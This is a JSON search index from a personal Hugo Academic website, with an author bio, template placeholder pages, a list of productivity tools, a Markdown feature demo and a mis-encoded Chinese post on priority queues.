[{"authors":["admin"],"categories":null,"content":"I am @Terry (Guoze, Tang), a graduate student in the School of Computing at Clemson Universvity. I graduated from Yunnan University Electronic and Information Engineering in 2014. After that, I studied Software Engineering and graduated from University of Science and Technology of China in 03 / 2017. After two years of study, I acquired a comprehensive knowledge of computer hardware and software. I was interested in embedded systems design. And I gained a lot, not only on specialized knowledge but also a scientific way of thinking.\n","date":1549324800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1567641600,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"http://www.guozet.me/author/Terry-Tang/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/Terry-Tang/","section":"authors","summary":"I am @Terry (Guoze, Tang), a graduate student in the School of Computing at Clemson Universvity. I graduated from Yunnan University Electronic and Information Engineering in 2014. After that, I studied Software Engineering and graduated from University of Science and Technology of China in 03 / 2017.","tags":null,"title":"Terry Tang","type":"authors"},{"authors":null,"categories":null,"content":"Flexibility This feature can be used for publishing content such as:\nOnline courses Project or software documentation Tutorials The courses folder may be renamed. For example, we can rename it to docs for software/project documentation or tutorials for creating an online course.\nDelete tutorials To remove these pages, delete the courses folder and see below to delete the associated menu link.\nUpdate site menu After renaming or deleting the courses folder, you may wish to update any [[main]] menu links to it by editing your menu configuration at config/_default/menus.toml.\nFor example, if you delete this folder, you can remove the following from your menu configuration:\n[[main]] name = \u0026quot;Courses\u0026quot; url = \u0026quot;courses/\u0026quot; weight = 50 Or, if you are creating a software documentation site, you can rename the courses folder to docs and update the associated Courses menu configuration to:\n[[main]] name = \u0026quot;Docs\u0026quot; url = \u0026quot;docs/\u0026quot; weight = 50 Update the docs menu If you use the docs layout, note that the name of the menu in the front matter should be in the form [menu.X] where X is the folder name. Hence, if you rename the courses/example/ folder, you should also rename the menu definitions in the front matter of files within courses/example/ from [menu.example] to [menu.\u0026lt;NewFolderName\u0026gt;].\n","date":1536451200,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1536451200,"objectID":"59c3ce8e202293146a8a934d37a4070b","permalink":"http://www.guozet.me/courses/example/","publishdate":"2018-09-09T00:00:00Z","relpermalink":"/courses/example/","section":"courses","summary":"Learn how to use Academic's docs layout for publishing online courses, software documentation, and tutorials.","tags":null,"title":"Overview","type":"docs"},{"authors":null,"categories":null,"content":"In this tutorial, I\u0026rsquo;ll share my top 10 tips for getting started with Academic:\nTip 1 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\nTip 2 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"74533bae41439377bd30f645c4677a27","permalink":"http://www.guozet.me/courses/example/example1/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/courses/example/example1/","section":"courses","summary":"In this tutorial, I\u0026rsquo;ll share my top 10 tips for getting started with Academic:\nTip 1 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum.","tags":null,"title":"Example Page 1","type":"docs"},{"authors":null,"categories":null,"content":"Here are some more tips for getting started with Academic:\nTip 3 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\nTip 4 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"1c2b5a11257c768c90d5050637d77d6a","permalink":"http://www.guozet.me/courses/example/example2/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/courses/example/example2/","section":"courses","summary":"Here are some more tips for getting started with Academic:\nTip 3 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum.","tags":null,"title":"Example Page 2","type":"docs"},{"authors":null,"categories":[["Notes"]],"content":" Hardware Laptop Mobile Phone Accessories Software Laptop Apps iOS Apps Cloud-based Apps Hardware Laptop Acer R11 Chromebook(11.5 inch, 2018)\nInformation:\n2018 year 11.6\u0026quot; HD (1366 x 768) 16:9 IPS 4 GB, DDR3L SDRAM, 32 GB SSD IntelÂ® CeleronÂ® N3150 processor Quad-core 1.60 GHz System: GalliumOS(xUbuntu) Mobile Phone iPhone 7 Plus(128GB)\nI like the iOS system. It\u0026rsquo;s simple and good for me to keep touch with my friends.\nAccessories iPad Pro(10.5 inch, 2017)\nThis iPad is my favorites produce. I usually use it to do somethings like follow:\nReading PDF files Write some post by markdown Software Laptop Apps Chrome VS code Electron-SSR AnyConnect iOS Apps Security\u0026amp;Network\nDuo Mobile:Secure Two-Factor Authentication App. Secure access to work and personal, cloud and on-premises apps with one simple app. Lastpass:A freemium password manager that stores encrypted passwords online. VPN: AnyConnect, Quantumult Productivity\nIFTTT Shortcuts Scannable Dropbox OfficeSuite Study\nGoodNotes Eudic Aboboo Reeder Health\nkeep MyFitnesspal YUNMAI Finance\nMint: Record all the cost from my bank.(We bring together all of your accounts, bills and more, so you can conveniently manage your finances from one dashboard.) éšæ‰‹è®°:Set the budget and record each cost by myself. Cloud-based Apps IFTTT: Setup automation between apps and service. AWS(Amazon Web services): Cloud computing Github Travis CI ","date":1573767772,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1573767772,"objectID":"1660870433355016a2f979972a510ee1","permalink":"http://www.guozet.me/post/My-workbench-and-Productivity-tools/","publishdate":"2019-11-14T21:42:52Z","relpermalink":"/post/My-workbench-and-Productivity-tools/","section":"post","summary":"Hardware Laptop Mobile Phone Accessories Software Laptop Apps iOS Apps Cloud-based Apps Hardware Laptop Acer R11 Chromebook(11.5 inch, 2018) Information: 2018 year 11.6\u0026quot; HD (1366 x 768) 16:9 IPS 4","tags":"Node","title":"My workbench and Productivity tools","type":"post"},{"authors":null,"categories":null,"content":"Academic is designed to give technical content creators a seamless experience. You can focus on the content and Academic handles the rest.\nHighlight your code snippets, take notes on math classes, and draw diagrams from textual representation.\nOn this page, you\u0026rsquo;ll find some examples of the types of technical content that can be rendered with Academic.\nExamples Code Academic supports a Markdown extension for highlighting code syntax. You can enable this feature by toggling the highlight option in your config/_default/params.toml file.\n```python import pandas as pd data = pd.read_csv(\u0026quot;data.csv\u0026quot;) data.head() ``` renders as\nimport pandas as pd data = pd.read_csv(\u0026quot;data.csv\u0026quot;) data.head() Math Academic supports a Markdown extension for $\\LaTeX$ math. You can enable this feature by toggling the math option in your config/_default/params.toml file.\nTo render inline or block math, wrap your LaTeX math with $...$ or $$...$$, respectively.\nExample math block:\n$$\\gamma_{n} = \\frac{ \\left | \\left (\\mathbf x_{n} - \\mathbf x_{n-1} \\right )^T \\left [\\nabla F (\\mathbf x_{n}) - \\nabla F (\\mathbf x_{n-1}) \\right ] \\right |} {\\left \\|\\nabla F(\\mathbf{x}_{n}) - \\nabla F(\\mathbf{x}_{n-1}) \\right \\|^2}$$ renders as\n$$\\gamma_{n} = \\frac{ \\left | \\left (\\mathbf x_{n} - \\mathbf x_{n-1} \\right )^T \\left [\\nabla F (\\mathbf x_{n}) - \\nabla F (\\mathbf x_{n-1}) \\right ] \\right |}{\\left |\\nabla F(\\mathbf{x}{n}) - \\nabla F(\\mathbf{x}{n-1}) \\right |^2}$$\nExample inline math $\\nabla F(\\mathbf{x}_{n})$ renders as $\\nabla F(\\mathbf{x}_{n})$.\nExample multi-line math using the \\\\\\\\ math linebreak:\n$$f(k;p_0^*) = \\begin{cases} p_0^* \u0026amp; \\text{if }k=1, \\\\\\\\ 1-p_0^* \u0026amp; \\text {if }k=0.\\end{cases}$$ renders as\n$$f(k;p_0^) = \\begin{cases} p_0^ \u0026amp; \\text{if }k=1, \\\\ 1-p_0^* \u0026amp; \\text {if }k=0.\\end{cases}$$\nDiagrams Academic supports a Markdown extension for diagrams. You can enable this feature by toggling the diagram option in your config/_default/params.toml file or by adding diagram: true to your page front matter.\nAn example flowchart:\n```mermaid graph TD A[Hard] --\u0026gt;|Text| B(Round) B --\u0026gt; C{Decision} C --\u0026gt;|One| D[Result 1] C --\u0026gt;|Two| E[Result 2] ``` renders as\ngraph TD A[Hard] --\u0026gt;|Text| B(Round) B --\u0026gt; C{Decision} C --\u0026gt;|One| D[Result 1] C --\u0026gt;|Two| E[Result 2] An example sequence diagram:\n```mermaid sequenceDiagram Alice-\u0026gt;\u0026gt;John: Hello John, how are you? loop Healthcheck John-\u0026gt;\u0026gt;John: Fight against hypochondria end Note right of John: Rational thoughts! John--\u0026gt;\u0026gt;Alice: Great! John-\u0026gt;\u0026gt;Bob: How about you? Bob--\u0026gt;\u0026gt;John: Jolly good! ``` renders as\nsequenceDiagram Alice-\u0026gt;\u0026gt;John: Hello John, how are you? loop Healthcheck John-\u0026gt;\u0026gt;John: Fight against hypochondria end Note right of John: Rational thoughts! John--\u0026gt;\u0026gt;Alice: Great! John-\u0026gt;\u0026gt;Bob: How about you? Bob--\u0026gt;\u0026gt;John: Jolly good! An example Gantt diagram:\n```mermaid gantt section Section Completed :done, des1, 2014-01-06,2014-01-08 Active :active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d ``` renders as\ngantt section Section Completed :done, des1, 2014-01-06,2014-01-08 Active :active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d An example class diagram:\n```mermaid classDiagram Class01 \u0026lt;|-- AveryLongClass : Cool \u0026lt;\u0026lt;interface\u0026gt;\u0026gt; Class01 Class09 --\u0026gt; C2 : Where am i? Class09 --* C3 Class09 --|\u0026gt; Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla class Class10 { \u0026lt;\u0026lt;service\u0026gt;\u0026gt; int id size() } ``` renders as\nclassDiagram Class01 \u0026lt;|-- AveryLongClass : Cool \u0026lt;\u0026lt;interface\u0026gt;\u0026gt; Class01 Class09 --\u0026gt; C2 : Where am i? Class09 --* C3 Class09 --|\u0026gt; Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla class Class10 { \u0026lt;\u0026lt;service\u0026gt;\u0026gt; int id size() } An example state diagram:\n```mermaid stateDiagram [*] --\u0026gt; Still Still --\u0026gt; [*] Still --\u0026gt; Moving Moving --\u0026gt; Still Moving --\u0026gt; Crash Crash --\u0026gt; [*] ``` renders as\nstateDiagram [*] --\u0026gt; Still Still --\u0026gt; [*] Still --\u0026gt; Moving Moving --\u0026gt; Still Moving --\u0026gt; Crash Crash --\u0026gt; [*] Todo lists You can even write your todo lists in Academic too:\n- [x] Write math example - [x] Write diagram example - [ ] Do something else renders as\nWrite math example Write diagram example Do something else Tables Represent your data in tables:\n| First Header | Second Header | | ------------- | ------------- | | Content Cell | Content Cell | | Content Cell | Content Cell | renders as\nFirst Header Second Header Content Cell Content Cell Content Cell Content Cell Asides Academic supports a shortcode for asides, also referred to as notices, hints, or alerts. By wrapping a paragraph in {{% alert note %}} ... {{% /alert %}}, it will render as an aside.\n{{% alert note %}} A Markdown aside is useful for displaying notices, hints, or definitions to your readers. {{% /alert %}} renders as\nA Markdown aside is useful for displaying notices, hints, or definitions to your readers. Icons Academic enables you to use a wide range of icons from Font Awesome and Academicons in addition to emojis.\nHere are some examples using the icon shortcode to render icons:\n{{\u0026lt; icon name=\u0026quot;terminal\u0026quot; pack=\u0026quot;fas\u0026quot; \u0026gt;}} Terminal {{\u0026lt; icon name=\u0026quot;python\u0026quot; pack=\u0026quot;fab\u0026quot; \u0026gt;}} Python {{\u0026lt; icon name=\u0026quot;r-project\u0026quot; pack=\u0026quot;fab\u0026quot; \u0026gt;}} R renders as\nTerminal\nPython\nR\nDid you find this page helpful? Consider sharing it ğŸ™Œ ","date":1562889600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1562889600,"objectID":"07e02bccc368a192a0c76c44918396c3","permalink":"http://www.guozet.me/post/writing-technical-content/","publishdate":"2019-07-12T00:00:00Z","relpermalink":"/post/writing-technical-content/","section":"post","summary":"Academic is designed to give technical content creators a seamless experience. You can focus on the content and Academic handles the rest.\nHighlight your code snippets, take notes on math classes, and draw diagrams from textual representation.","tags":null,"title":"Writing technical content in Academic","type":"post"},{"authors":null,"categories":[["Algorithm"]],"content":"ä¼˜å…ˆçº§é˜Ÿåˆ— ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼šé˜Ÿåˆ—ä¸­çš„å…ƒç´ å¸¦æœ‰ä¼˜å…ˆçº§ï¼Œå…ƒç´ æŒ‰ç…§ä¼˜å…ˆçº§ä¸åŒå¤„äºé˜Ÿåˆ—ä¸­çš„ä¸åŒä½ç½®ï¼\nç®€å•çš„ FIFO é˜Ÿåˆ—ï¼Œå…ƒç´ çš„ä½ç½®ä¸å…ƒç´ è¢«åŠ å…¥è¿›å»æ—¶å€™çš„ä½ç½®ç›¸åŒï¼ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­ï¼Œå…ƒç´ å…·æœ‰æœ€é«˜ä¼˜å…ˆçº§ï¼ˆé€šå¸¸å®šä¹‰ä¸ºå…·æœ‰æœ€å°çš„ key å€¼ï¼‰çš„å…ƒç´ æ€»æ˜¯å…ˆä»é˜Ÿåˆ—ä¸­å‡ºæ¥ï¼\nä½¿ç”¨åœºæ™¯ï¼š ä»»åŠ¡è°ƒåº¦: æ“ä½œç³»ç»Ÿä¸­çš„è¿›ç¨‹è°ƒåº¦å°±æ˜¯ä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œæœ‰äº›è¿›ç¨‹ä¼˜å…ˆçº§å°±æ˜¯è¦é«˜äºå…¶ä»–è¿›ç¨‹ï¼ˆä¾‹å¦‚æ¥ç”µè¯ä¼˜å…ˆçº§æ¯”ç©æ¸¸æˆé«˜ï¼‰ æ’åºï¼š æˆ‘ä»¬å°†å…ƒç´ æ’å…¥åˆ°ä¸€ä¸ª priority queueä¹‹åï¼Œå…ƒç´ åœ¨ä¼˜å…ˆçº§é˜Ÿåˆ—é‡Œå°±å·²ç»æ˜¯æ’å¥½åºçš„äº†(æ—¶é—´å¤æ‚åº¦ï¼šã€€$O(n \\log n)$) ä½¿ç”¨åœ¨å¤æ‚çš„ç®—æ³•ä¸­ï¼šã€€æ¯”å¦‚ Dijksta\u0026rsquo;s Shortest path algorithm ç®—æ³•ä¸­ä½¿ç”¨ priority queue æ¥ä¿æŒæ²¡ä¸€ä¸ªæ—¶åˆ»çš„è·¯å¾„é•¿åº¦ æ”¯æŒçš„æ“ä½œ æ‰€æœ‰çš„ä¼˜å…ˆçº§é˜Ÿåˆ—éƒ½æ”¯æŒçš„æ“ä½œï¼š\ninsert(e,k) : Insert a new element e with key k (æ’å…¥ä¸€ä¸ªä¼˜å…ˆçº§æ•°å€¼ä¸ºkeyçš„å…ƒç´ e, keyå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šå¤§) remove-min: åˆ é™¤å¹¶è¿”å›keyå€¼æœ€å°çš„å…ƒç´ (ä¼˜å…ˆçº§æœ€å¤§ï¼Œä¹Ÿå°±æ˜¯åœ¨é˜Ÿé¦–çš„å…ƒç´ ) ç‰¹æ®Šæ“ä½œï¼š\nDecrease-key(e, kï¼‰:å‡å°‘ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­ key ä¸º e çš„å…ƒç´ çš„æ•°å€¼(å‡å°‘é‡ä¸º k å€¼) Increase-key(e, kï¼‰:å¢åŠ ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­ key ä¸º e çš„å…ƒç´ çš„æ•°å€¼(å¢åŠ é‡ä¸º k å€¼) Delete(e): åœ¨ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­å»æ‰ keyã€€å€¼ä¸º eã€€çš„å…ƒç´  Find-min: è¿”å›æŒ‡å‘ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­çš„æœ€å°å€¼çš„æŒ‡é’ˆ Decrease-key(e, kï¼‰å¸¸å¸¸è¢«ä½¿ç”¨ï¼Œæ¯”å¦‚è¿ªæ°æ–¯ç‰¹æ‹‰ç®—æ³•ä¸­éœ€è¦ç»å¸¸ä½¿ç”¨ï¼Œå› ä¸ºç½‘ç»œç»“ç‚¹çš„æƒå€¼ä¸€æ—¦å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆå°±éœ€è¦é‡æ–°æ›´æ–°ä¸€è¾¹ä¼˜å…ˆçº§é˜Ÿåˆ—\nä¸Šé¢çš„å‡ ä¸ªæ“ä½œæ˜¯å¯ä»¥ç›¸äº’è¿›è¡Œè½¬æ¢çš„ï¼š\nå¦‚æœç»™æˆ‘ä»¬ Insert(e, k) å’Œã€€delete(e) æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªæ“ä½œå®ç°ã€€increase-keyã€€å’Œã€€decrease-keyã€€æ“ä½œ å¦‚æœç»™æˆ‘ä»¬ increase-keyã€€å’Œã€€decrease-keyã€€æ“ä½œæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªæ“ä½œå®ç°ã€€delete(e) æ“ä½œ å¦‚æœç»™æˆ‘ä»¬ find-minã€€å’Œã€€deleteã€€æ“ä½œæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªæ“ä½œå®ç°ã€€remove-min æ“ä½œ å¦‚æœç»™æˆ‘ä»¬ remove-minã€€å’Œã€€insertã€€æ“ä½œæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªæ“ä½œå®ç°ã€€find-min æ“ä½œ ","date":1556827913,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1556827913,"objectID":"4ad0ef188ac95dc180f33409ca55ce6e","permalink":"http://www.guozet.me/post/Algorithm-Priority-Queue/","publishdate":"2019-05-02T20:11:53Z","relpermalink":"/post/Algorithm-Priority-Queue/","section":"post","summary":"ä¼˜å…ˆçº§é˜Ÿåˆ— ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼šé˜Ÿåˆ—ä¸­çš„å…ƒç´ 